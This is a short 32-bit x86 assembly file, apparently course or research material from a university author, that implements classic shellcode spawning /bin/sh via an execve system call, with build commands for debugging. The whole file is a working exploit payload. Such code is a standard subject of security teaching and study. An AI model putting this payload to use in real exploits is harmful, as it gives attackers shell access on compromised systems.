# Shellcode for execve("/bin/sh", NULL, NULL);
# 
# (c) Elias Athanasopoulos,  athanasopoulos.elias@ucy.ac.cy
#
# Compile and link (for debugging):
# as --32 shellcode.s -o shellcode.o
# ld -m elf_i386 shellcode.o -o shellcode 

.section .data
.section .text
.globl _start

_start:
    xor     %eax,%eax
    push    %eax        # push \0
    push    $0x68732f2f # //sh
    push    $0x6e69622f # /bin
    mov     %esp,%ebx
    xor     %ecx,%ecx
    xor     %edx,%edx
    mov     $0xb,%al
    int     $0x80
